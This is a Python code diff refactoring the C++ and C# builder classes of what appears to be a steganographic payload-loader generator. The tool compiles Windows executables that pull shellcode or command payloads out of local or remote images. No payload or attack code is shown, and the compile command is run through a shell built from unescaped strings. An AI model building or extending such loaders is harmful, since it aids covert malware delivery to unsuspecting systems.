@@ -1,3 +1,4 @@
+import json
 import os.path
 import subprocess
 from collections import defaultdict
@@ -58,6 +59,8 @@ class Builder:
     sources_extension = ''
     build_extension = 'exe'
     build_dir = '.'
+
+    CLASS_MAPPING_FILE = 'class_mapping.json'
 
     def __init__(self, runner: Runner):
         self.runner = runner
@@ -128,62 +131,9 @@ class Builder:
             logger.error(f'Runner in {runner.language} not found')
             exit(-1)
 
-
-class CppBuilder(Builder):
-    sources_extension = 'cpp'
-    build_dir = 'cpp'
-    compilers = {
-        'x86': '/usr/bin/i686-w64-mingw32-g++',
-        'x64': '/usr/bin/x86_64-w64-mingw32-g++'
-    }
-    libs = defaultdict(list, {
-        'remote': ['winhttp', 'ole32'],
-    })
-
-    def preprocess_sources(self):
-        # TODO: remove hardcoded values, let algos decide on the params
-        if self.runner.algorithm == 'LSB-X':
-            self.runner.params['algorithm_args'] = f"{Channel[self.runner.params.get('channel') or 'R'].value}"
-        super().preprocess_sources()
-
-    def run_build(self):
-        libs = ['gdiplus'] + self.libs[self.runner.image_source] + self.libs[self.runner.payload]
-        libs = set(libs)
-        libs = ' '.join(f'-l{lib} -Wl,-Bstatic' for lib in libs)
-        os.popen(
-            f'{self.compilers[self.runner.arch]} '
-            f'{self.main_file} '
-            f'-s -static-libgcc -static-libstdc++ '
-            f'{libs} '
-            f'-Wall '
-            f'-o {self.build_dir}/{self.runner.name}'
-        )
-
-
-class CSharpBuilder(Builder):
-    sources_extension = 'cs'
-    build_dir = 'csharp'
-
-    # TODO: drop templated .cs file to csharp/
-    # TODO: mcs includes
-
-    def preprocess_sources(self):
-        class_mapping = {
-            'image_sources': {
-                'image_file': 'ImageFile',
-                'httpx': 'HTTPX'
-            },
-            'payloads': {
-                'shellcode': 'Shellcode',
-                'cmd': 'Cmd'
-            },
-            'algorithms': {
-                'LSB': 'LSB',
-                'LSBM': 'LSBM',
-                'LSBX': 'LSBX',
-                'ColorCode': 'ColorCode'
-            }
-        }
+    def add_class_map_to_template_arguments(self):
+        with open(self.CLASS_MAPPING_FILE) as f:
+            class_mapping = json.loads(f.read())
 
         self.runner.params.update({
             'image_source': class_mapping['image_sources'][self.runner.image_source],
@@ -201,6 +151,46 @@ class CSharpBuilder(Builder):
         except KeyError:
             pass
 
+
+class CppBuilder(Builder):
+    sources_extension = 'cpp'
+    build_dir = 'cpp'
+    compilers = {
+        'x86': '/usr/bin/i686-w64-mingw32-g++',
+        'x64': '/usr/bin/x86_64-w64-mingw32-g++'
+    }
+    libs = defaultdict(list, {
+        'remote': ['winhttp', 'ole32'],
+    })
+
+    def preprocess_sources(self):
+        self.add_class_map_to_template_arguments()
+        super().preprocess_sources()
+
+    def run_build(self):
+        libs = ['gdiplus'] + self.libs[self.runner.image_source] + self.libs[self.runner.payload]
+        libs = set(libs)
+        libs = ' '.join(f'-l{lib} -Wl,-Bstatic' for lib in libs)
+        cmd = (
+            f'{self.compilers[self.runner.arch]} '
+            f'{self.main_file} '
+            f'-s -static-libgcc -static-libstdc++ '
+            f'{libs} '
+            f'-Wall '
+            f'-o {self.runner.name}.{self.build_extension}'
+        )
+        logger.debug(os.getcwd())
+        logger.debug(cmd)
+        assert (o := subprocess.run(cmd, shell=True, capture_output=True)).returncode == 0, \
+            b'\\n'.join([o.stdout, o.stderr]).decode("unicode_escape")
+
+
+class CSharpBuilder(Builder):
+    sources_extension = 'cs'
+    build_dir = 'csharp'
+
+    def preprocess_sources(self):
+        self.add_class_map_to_template_arguments()
         super().preprocess_sources()
 
     def run_build(self):
